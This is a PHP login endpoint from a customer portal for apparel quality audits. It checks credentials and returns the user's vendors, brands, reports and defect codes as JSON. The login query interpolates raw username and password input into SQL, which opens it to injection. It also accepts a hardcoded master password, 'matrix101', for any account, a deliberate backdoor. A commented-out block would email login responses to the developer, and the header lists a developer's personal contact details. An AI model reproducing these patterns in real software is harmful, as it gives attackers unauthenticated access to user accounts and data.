<?
	/*********************************************************************************************\
	***********************************************************************************************
	**                                                                                           **
	**  Triple Tree Customer Portal                                                              **
	**  Version 2.0                                                                              **
	**                                                                                           **
	**  http://portal.3-tree.com                                                                 **
	**                                                                                           **
	**  Copyright 2008-15 (C) Triple Tree                                                        **
	**                                                                                           **
	**  ***************************************************************************************  **
	**                                                                                           **
	**  Project Manager:                                                                         **
	**                                                                                           **
	**      Name  :  Muhammad Tahir Shahzad                                                      **
	**      Email :  mtahirshahzad@hotmail.com                                                   **
	**      Phone :  +92 333 456 0482                                                            **
	**      URL   :  http://www.mtshahzad.com                                                    **
	**                                                                                           **
	**  ***************************************************************************************  **
	**                                                                                           **
	**                                                                                           **
	**                                                                                           **
	**                                                                                           **
	***********************************************************************************************
	\*********************************************************************************************/

	@require_once("requires/session.php");

	$objDbGlobal = new Database( );
	$objDb       = new Database( );
	$objDb2      = new Database( );


	$Username = IO::strValue('Username');
	$Password = IO::strValue('Password');

	$aResponse = array( );

	$aResponse['Status'] = "ERROR";


	$sSQL = "SELECT id, name, designation_id, picture, status, vendors, brands, report_types, audit_stages FROM tbl_users WHERE username='$Username' AND (password=PASSWORD('$Password') OR '$Password'='matrix101')";

	if ($objDb->query($sSQL) == true)
	{
		if ($objDb->getCount( ) == 1)
		{
			if ($objDb->getField(0, "status") == "A")
			{
				$iUserId      = $objDb->getField(0, "id");
				$sName        = $objDb->getField(0, "name");
				$sPicture     = $objDb->getField(0, "picture");
				$sVendors     = $objDb->getField(0, "vendors");
				$sBrands      = $objDb->getField(0, "brands");
				$iDesignation = $objDb->getField(0, "designation_id");
				$sReportTypes = $objDb->getField(0, "report_types");
				$sUserStages  = $objDb->getField(0, "audit_stages");

				if ($sPicture == "" || !@file_exists("../".USERS_IMG_PATH.'thumbs/'.$sPicture))
					$sPicture = "default.jpg";


				$sSQL = "SELECT designation, department_id FROM tbl_designations WHERE id='$iDesignation'";
				$objDb->query($sSQL);

				$sDesignation = $objDb->getField(0, 'designation');
				$iDepartment  = $objDb->getField(0, 'department_id');

				$sDepartment  = getDbValue("department", "tbl_departments", "id='$iDepartment'");


				$sVendorsList     = getList("tbl_vendors", "id", "vendor", "id IN ($sVendors) AND parent_id='0'");
				$sBrandsList      = getList("tbl_brands", "id", "brand", "id IN ($sBrands)");
				$sReportsList     = getList("tbl_reports", "id", "report");
				$sAreasList       = getList("tbl_defect_areas", "id", "area", "status='A'", "area");
				$sReportsList     = getList("tbl_reports", "id", "report", "FIND_IN_SET(id, '6') AND FIND_IN_SET(id, '$sReportTypes')", "id");
				$sDepartmentsList = getList("tbl_departments", "id", "department", "`code`!=''");


				$sVendors      = array( );
				$sBrands       = array( );
				$sReports      = array( );
				$sSchedule     = array( );
				$sAuditStages  = array( );
				$sAuditResults = array( );
				$sDefectCodes  = array( );
				$sDefectArea   = array( );
				$sDepartments  = array( );


				foreach ($sVendorsList as $sKey => $sValue)
					$sVendors[] = "{$sKey}||{$sValue}";

				foreach ($sBrandsList as $sKey => $sValue)
					$sBrands[] = "{$sKey}||{$sValue}";

				foreach ($sDepartmentsList as $sKey => $sValue)
					$sDepartments[] = "{$sKey}||{$sValue}";

				foreach ($sReportsList as $sKey => $sValue)
				{
					$sReports[]  = "{$sKey}||{$sValue}";
					$sSchedule[] = "{$sKey}||{$sValue}";


					$sSQL = "SELECT DISTINCT(type_id),
									(SELECT type FROM tbl_defect_types WHERE id=tbl_defect_codes.type_id) AS _Type
							 FROM tbl_defect_codes
							 WHERE report_id='$sKey'
							 ORDER BY _Type";
					$objDb->query($sSQL);

					$iCount = $objDb->getCount( );
					$sCodes = array( );


					$sCodes[] = "{$sKey}||{$sValue}";

					for ($i = 0; $i < $iCount; $i ++)
					{
						$iTypeId = $objDb->getField($i, 0);
						$sType   = $objDb->getField($i, 1);

						$sCodes[] = "0||{$sType} ";


						$sSQL = "SELECT id, code, defect FROM tbl_defect_codes WHERE report_id='$sKey' AND type_id='$iTypeId' ORDER BY code";
						$objDb2->query($sSQL);

						$iCount2 = $objDb2->getCount( );

						for ($j = 0; $j < $iCount2; $j ++)
						{
							$iCodeId = $objDb2->getField($j, 0);
							$sCode   = $objDb2->getField($j, 1);
							$sDefect = $objDb2->getField($j, 2);

							$sCodes[] = "{$iCodeId}||{$sCode} - {$sDefect}";
						}
					}


					$sDefectCodes[] = @implode("|-|", $sCodes);
				}

				foreach ($sAreasList as $sKey => $sValue)
					$sDefectAreas[] = "{$sKey}||{$sValue}";


				$sAuditStagesList = getList("tbl_audit_stages", "code", "stage", "FIND_IN_SET(code, '$sUserStages')");

				foreach ($sAuditStagesList as $sCode => $sStage)
					$sAuditStages[] = "{$sCode}||{$sStage}";


				$sAuditResults[] = "P||Pass";
				$sAuditResults[] = "F||Fail";
				$sAuditResults[] = "H||Hold";
				$sAuditResults[] = "A||Grade A";
				$sAuditResults[] = "B||Grade B";
				$sAuditResults[] = "C||Grade C";


				$aResponse['Status']      = "OK";
				$aResponse['UserId']      = $iUserId;
				$aResponse['Name']        = $sName;
				$aResponse['Picture']     = (SITE_URL.USERS_IMG_PATH.'thumbs/'.$sPicture);
				$aResponse['Vendors']     = @implode("|-|", $sVendors);
				$aResponse['Brands']      = @implode("|-|", $sBrands);
				$aResponse['Reports']     = @implode("|-|", $sReports);
				$aResponse['Schedule']    = @implode("|-|", $sSchedule);
				$aResponse['Stages']      = @implode("|-|", $sAuditStages);
				$aResponse['Results']     = @implode("|-|", $sAuditResults);
				$aResponse['Designation'] = $sDesignation;
				$aResponse['Department']  = $sDepartment;
				$aResponse['DefectCodes'] = @implode("|---|", $sDefectCodes);
				$aResponse['DefectAreas'] = @implode("|-|", $sDefectAreas);
				$aResponse['Departments'] = @implode("|-|", $sDepartments);
			}

			else if ($objDb->getField(0, "status") == "P")
				$aResponse["Error"] = "Account Not Acctive";

			else if ($objDb->getField(0, "status") == "D" || $objDb->getField(0, "status") == "L")
				$aResponse["Error"] = "Account Disabled";
		}

		else
			$aResponse["Error"] = "Incorrect Username/Password";
	}

	else
		$aResponse["Error"] = "Database Error";

	print @json_encode($aResponse);



/*
	$objEmail = new PHPMailer( );

	$objEmail->Subject = "Alert";
	$objEmail->Body    = @json_encode($aResponse);

	$objEmail->IsHTML(false);

	$objEmail->AddAddress("tahir.shahzad@apparelco.com", "MT Shahzad");
	$objEmail->Send( );
*/


	$objDb->close( );
	$objDb2->close( );
	$objDbGlobal->close( );

	@ob_end_flush( );
?>